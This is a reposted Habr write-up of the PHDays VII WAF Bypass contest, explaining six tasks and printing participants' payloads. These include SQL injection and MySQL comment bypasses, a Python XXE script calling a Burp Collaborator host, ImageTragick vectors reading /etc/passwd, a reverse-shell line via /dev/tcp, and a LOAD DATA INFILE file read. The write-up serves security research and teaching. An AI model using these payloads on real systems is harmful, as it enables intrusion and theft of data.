<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Analysis of tasks of the WAF Bypass contest on PHDays VII</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The PHDays International Information Security Forum has once again become a platform for the WAF Bypass competition. The goal of the competition is to...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Analysis of tasks of the WAF Bypass contest on PHDays VII</h1><div class="post__text post__text-html js-mediator-article">  The PHDays International Information Security Forum has once again become a platform for the WAF Bypass competition.  The goal of the competition is to bypass the protection mechanisms of the <a href="https://www.ptsecurity.com/ru-ru/products/af/">PT Application Firewall</a> in order to get special flags through vulnerabilities in prepared web applications.  Each of the tasks implied the options for circumventing the PT Application Firewall, which, in turn, was made possible by disabling a number of security features.  This year, we also decided to test a prototype of a database firewall (DBFW), which analyzed SQL traffic from applications to databases (DB). <br><a name="habracut"></a><br><h3>  Task 1 (JJ) </h3><br>  <i>350 points</i> <br><br>  The task was proposed to bypass the algorithm for detecting SQL injections.  A PHP module was installed on the application server, which replaces the original mysql_query () function with its own.  In it, the values ‚Äã‚Äãof HTTP parameters (GET, POST, Cookie) are added to the beginning of the SQL query as a comment. <br><br><img src="https://habrastorage.org/web/9e9/388/366/9e9388366ba847148ede643c1324b7e5">
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      After the SQL query from the application is sent to the database using a substitute function, it is intercepted by DBFW.  That retrieves the values ‚Äã‚Äãof the HTTP parameters from the comment and searches them in the SQL query.  If the substring corresponding to the parameter value is found, it is replaced by a constant.  Then two requests are tokenized: before and after replacement.  If the number of received tokens does not match, then this indicates a SQL injection.  It is known that the main symptom of an injection-type attack is a change in the parse tree.  If the number of tokens has changed, then the parse tree has changed, which means an injection has occurred.  We disclosed the logic of this algorithm in the report ‚Äú <a href="https://raz0r.name/talks/database-firewall-from-scratch/">Database Firewall from Scratch</a> ‚Äù, where we shared our experience in the study of DBFW security mechanisms.  So those who visited the report could understand the main drawback of this approach: it‚Äôs impossible to draw a conclusion about the injection based on the number of tokens in general, since the parse tree can be changed so that the number of tokens in the original and analyzed queries will match.  For example, an attacker can add comments to his vector in such a way that the number of tokens in the requests will be the same, but the tokens themselves will be different.  The correct way is to build and compare abstract syntax trees (AST) of two queries.  Thus, in order to complete the task, it was necessary to create a vector that coincided with the original request without the injection by the number of tokens: <br><br> <code>/post.php?p=-1 union select 1,2,(select flag from flags order by id,1),4 -- -</code> <br> <br><img src="https://habrastorage.org/web/14c/1cd/04e/14c1cd04e8834557a18437b5ab7328c9"><br><br>  Participants found a flaw in our ANTLR parser for MySQL.  The fact is that MySQL supports <a href="https://dev.mysql.com/doc/refman/5.7/en/comments.html">conditional comments</a> using the / * construct!  ... * /.  Anything inside this comment will be executed by MySQL, but other databases will ignore such a construction. <br><br>  <code>http://task1.waf-bypass.phdays.com/post.php?p=(select /*!50718 ST_LatFromGeoHash((SELECT table_name FROm information_schema.tables LIMIT 1)) */) and true and true and true order by id desc limit 10 --</code> (Arseny Sharoglazov) <br><br>  <code>http://task1.waf-bypass.phdays.com/post.php?p=/*!1111111 union select 1 id,flag,1,1 from flags where 1*/</code> (Sergey Bobrov) <br><br><h3>  Task 2 (KM) </h3><br>  <i>250 points</i> <br><br>  In the second task, participants had access to an application that allowed adding notes.  In this case, in the p parameter, a full SQL query was sent to hex: <br><br> <code>http://task2.waf-bypass.phdays.com/notes.php?q=53454c454354207469746c652c20626f64792046524f4d206e6f746573204c494d4954203235 (SELECT title, body FROM notes LIMIT 25 )</code> <br> <br>  In ALFAScript, we set attribute access control (ABAC) policies that allow users to perform only INSERT, UPDATE and SELECT only for the notes table.  Thus, attempts to access the flags table were blocked.  But we laid the detour by allowing execution of the CREATE statement.  Our proposed solution was to create an <a href="https://dev.mysql.com/doc/refman/5.7/en/create-event.html">event</a> that would write the flag in the notes table: <br><br> <code>CREATE EVENT `new_event` ON SCHEDULE EVERY 60 SECOND STARTS CURRENT_TIMESTAMP ON COMPLETION NOT PRESERVE ENABLE COMMENT '' DO insert into notes (title, body) VALUES ((select flag from flags limit 1), 2)</code> <br> <br><img src="https://habrastorage.org/web/565/d55/4a3/565d554a37384eac966476c66569b0e0"><br><br>  In addition to CREATE EVENT, you could use CREATE TABLE and get the flag in the MySQL message, forcibly causing an error (the decision of Arseny Sharoglazov): <br><br> <code>CREATE TABLE ggg AS SELECT ST_LongFromGeoHash (flag) FROM flags;</code> <br> <br><img src="https://habrastorage.org/web/05d/1a1/998/05d1a1998cb74b889370b8c6d4a2eb31"><br><br>  Sergey Bobrov decided in an alternative way, using the <a href="https://dev.mysql.com/doc/refman/5.7/en/insert-on-duplicate.html">ON DUPLICATE KEY UPDATE</a> construct, which allows you to execute an UPDATE inside an INSERT with one query: <br><br> <code>INSERT INTO notes SELECT 1,2,3 FROM notes,flags as a ON DUPLICATE KEY UPDATE body = flag</code> <br> <br><h3>  Task 3 (AG) </h3><br>  <i>300 points</i> <br><br>  To complete the task, participants had to detect and exploit the vulnerability in one of the old versions of the Adobe BlazeDS demo application.  The peculiarity of the application is that it uses the AMF (Action Message Format) protocol for communication with the server.  AMF itself is a serialized structure with field typing.  One type is XML (0x0b), incorrect parsing of which led to a <a href="http://www.agarri.fr/kom/archives/2015/12/17/amf_parsing_and_xxe/index.html">number of vulnerabilities in libraries for working with AMF</a> , including in BlazeDS. <br><br>  WAF had the built-in AMF parser, however, the parsing of external Flex objects was disabled for the job: AcknowledgeMessageExt (DSK alias), CommandMessageExt (DSC), AsyncMessageExt (DSA).  At the same time, BlazeDS could parse such messages and find XML in them, which ultimately led to a vulnerability to the XXE attack. <br><br>  You can create such a request using the pyamf library: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> pyamf <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> httplib <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> uuid <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pyamf.flex.messaging <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> RemotingMessage, AcknowledgeMessageExt <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pyamf.remoting <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> Envelope, Request, decode hostname = <span class="hljs-string"><span class="hljs-string">'task3.waf-bypass.phdays.com'</span></span> port = <span class="hljs-number"><span class="hljs-number">80</span></span> path = <span class="hljs-string"><span class="hljs-string">'/samples/messagebroker/amf'</span></span> request = AcknowledgeMessageExt( operation=<span class="hljs-string"><span class="hljs-string">"findEmployeesByName"</span></span>, destination=<span class="hljs-string"><span class="hljs-string">"runtime-employee-ro"</span></span>, messageId=<span class="hljs-keyword"><span class="hljs-keyword">None</span></span>, body=[ <span class="hljs-string"><span class="hljs-string">'&lt;!DOCTYPE x [ '</span></span> <span class="hljs-string"><span class="hljs-string">'&lt;!ENTITY foo SYSTEM "http://dta58o8o6fljzkvl52h8458lacg54u.burpcollaborator.net"&gt; ]&gt;'</span></span> <span class="hljs-string"><span class="hljs-string">'&lt;x&gt;External entity 1: &amp;foo;&lt;/x&gt;'</span></span>], clientId=<span class="hljs-keyword"><span class="hljs-keyword">None</span></span>, headers={<span class="hljs-string"><span class="hljs-string">'DSId'</span></span>: str(uuid.uuid4()).upper(), <span class="hljs-string"><span class="hljs-string">'DSEndpoint'</span></span>: <span class="hljs-string"><span class="hljs-string">'my-amf'</span></span>} ) envelope = Envelope(amfVersion=<span class="hljs-number"><span class="hljs-number">3</span></span>) envelope[<span class="hljs-string"><span class="hljs-string">"/%d"</span></span> % <span class="hljs-number"><span class="hljs-number">1</span></span>] = Request(<span class="hljs-string"><span class="hljs-string">u'null'</span></span>, [request]) message = pyamf.remoting.encode(envelope) conn = httplib.HTTPConnection(hostname, port) conn.request(<span class="hljs-string"><span class="hljs-string">'POST'</span></span>, path, message.getvalue(), headers={<span class="hljs-string"><span class="hljs-string">'Content-Type'</span></span>: <span class="hljs-string"><span class="hljs-string">'application/x-amf'</span></span>}) resp = conn.getresponse() data = resp.read() content = decode(data) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> content</code> </pre> <br><br>  BlazeDS was configured to work through an internal transparent proxy that added a header with a flag to all outgoing requests. <br><br><img src="https://habrastorage.org/web/0b3/49f/5db/0b349f5dbceb425a8de1b0383e96f74c"><br><br><h3>  Task 4 (KP) </h3><br>  <i>200 points</i> <br><br>  For the task, a version of the Pasteboard web application was used, vulnerable to the <a href="https://imagetragick.com/">Imagetragick</a> attack.  WAF was specifically configured to filter only the following keywords: <br> <code>url, caption:, label:, ephemeral:, msl:</code> <br> <br>  However, less common vectors were available.  For example, the text wrapper (unlike the label, the "@" character is not required before the file name): <br><br> <code>push graphic-context <br> viewbox 0 0 640 480 <br> image over 0,0 0,0 'text:/etc/passwd' <br> pop graphic-context</code> <br> <br>  The output was a picture with the contents of the / etc / passwd file: <br><br><img src="https://habrastorage.org/web/2c0/b66/50a/2c0b6650aaee4cab8d2c352a8d26387c"><br><br>  Arseny Sharoglazov used the vector with image over: <br><br> <code>push graphic-context <br> encoding "UTF-8" <br> viewbox 0 0 1 1 <br> affine 1 0 0 1 0 0 <br> push graphic-context <br> image Over 0,0 1,1 '|/bin/sh -i &gt; /dev/tcp/ip/80 0&lt;&amp;1 2&gt;&amp;1' <br> pop graphic-context <br> pop graphic-context</code> <br> <br>  Sergey Bobrov found in the source of imagemagick a pango: wrapper wrapper, which was not previously mentioned in known exploits. <br><br> <code>push graphic-context <br> viewbox 0 0 640 480 <br> image over 0,0 0,0 'pango:@/etc/passwd' <br> pop graphic-context</code> <br> <br><h3>  Task 5 (GM) </h3><br>  <i>250 points</i> <br><br>  The task was a search form vulnerable to SQL injection.  The table with the search result contained the publickey field.  The task was to deduce the value of the privatekey field through a SQL injection.  The following ABAC policy set on ALFAScript was used: <br><br> <code>namespace example { <br> export policy Main { <br> target clause action == "select" <br> apply denyUnlessPermit <br> <br> rule r1 { <br> permit <br> target clause resource.schema.id == "information_schema" <br> } <br> <br> rule r2 { <br> permit <br> target clause resource.schema.id == "task5" <br> and resource.table.id == "users" <br> and resource.column.id == "publickey" <br> } <br> <br> rule r3 { <br> permit <br> target clause resource.schema.id == "task5" <br> and resource.table.id == "users" <br> and resource.column.id == "name" <br> } <br> } <br> }</code> <br> <br>  Here you need to pay attention to the keyword denyUnlessPermit.  Within XACML, there are several types of decision combination algorithms for describing attribute access control policies.  The use of the denyUnlessPermit algorithm means that a request will be allowed if and only if at least one of the rules allows the user to access the resource.  DBFW does not know the actual structure of the DBMS, so when it sees a query of the type SELECT a, b from c, d, it does not know where it is, for example, column a: in the table with or d.  In the case of such requests, DBFW is forced to check the user's access to all resource options.  In this example, to the columns ca, cb, da and db Therefore, if we build a query that will contain at least one allowed column, then using a sample of two tables, we can extract the privatekey: <br><br> <code>Petrov' union select name, privatekey from information_schema.columns,users where name = 'Petrov' --</code> <br> <br><img src="https://habrastorage.org/web/b34/1c9/cce/b341c9cce86d41bf88e43889210001c9"><br><br><h3>  Task 6 (ES) </h3><br>  <i>300 points</i> <br><br>  The web application for the task had two functions: loading CSV files with a list of contacts and a contact search form that contained a SQL injection.  The DBFW algorithm called ‚ÄúDejector‚Äù was used as a defense mechanism.  For the first time, this method of detecting SQL injections was described in the work of Hansen and Patterson " <a href="http://www.blackhat.com/presentations/bh-usa-05/BH_US_05-Hansen-Patterson/HP2005.pdf">Guns and Butter Towards Formal Axioms of Input Validation</a> ".  Its essence is that according to the set of well-known requests of a web application (for example, such a large number of requests can be obtained by static analyzers of the source code), the subgramm of the SQL language is built.  A parser is generated for this grammar.  If the request is recognized by the parser, then the request belongs to the language, otherwise the request does not belong to the language, and therefore is fake. <br><br>  For the assignment, we prepared a grammar that described valid queries.  The ability to upload files to CSV made it clear that the MySQL user could work with files.  Another hint was contained in the error: mysqli_multi_query () was used, which means that stacked queries worked.  Normal LOAD_FILE () was forbidden by grammar, however <a href="https://dev.mysql.com/doc/refman/5.7/en/load-data.html">LOAD DATA INFILE</a> was available: <br><br> <code>'; load data infile '/etc/passwd' into table users character set 'utf8</code> <br> <br><img src="https://habrastorage.org/web/459/ddb/199/459ddb1990bf41fc89b0da7abe36163e"><br><br><h3>  results </h3><br><br><img src="https://habrastorage.org/web/5a3/f39/185/5a3f391857f340b18e35f266c66a318f"><br><br>  The first and second places were taken by Kaspersky Lab specialists - Sergey Bobrov and Arseny Sharoglazov.  Third place went to a student of Tyumen State University, Andrei Semakin.  Congratulations to the winners! <br><br>  Arseny Reutov (@ Raz0r), Dmitry Nagibin, Igor Kanygin (@akamajoris), Denis Kolegov, Nikolai Tkachenko, Ivan Hudyashov </div><p>Source: <a href="https://habr.com/ru/post/330002/">https://habr.com/ru/post/330002/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../329992/index.html">Article translation: Best Practice for Creating Git Commit from OpenStack</a></li>
<li><a href="../329994/index.html">BI.ZONE Announces CTFzone Presidential Election</a></li>
<li><a href="../329996/index.html">Simple React Router v4 Tutorial</a></li>
<li><a href="../329998/index.html">Quest from EPAM: Five Tasks from .NET Interviews</a></li>
<li><a href="../330000/index.html">‚ÄúThe lifetime of a tab can be almost endless‚Äù: Timofey Chaptykov about JS development on VKontakte</a></li>
<li><a href="../330004/index.html">Hard Reverse or features reverse files for PowerPC architecture Big-Endian</a></li>
<li><a href="../330006/index.html">Understanding Array.prototype.reduce () and Recursion Using the Example of Apple Pie</a></li>
<li><a href="../330008/index.html">How not to give the algorithm to sell the bank</a></li>
<li><a href="../330010/index.html">HPE 3PAR StoreServ 9450</a></li>
<li><a href="../330012/index.html">Attack on AB test: recipe 'R' + t (101) + 'es46'</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>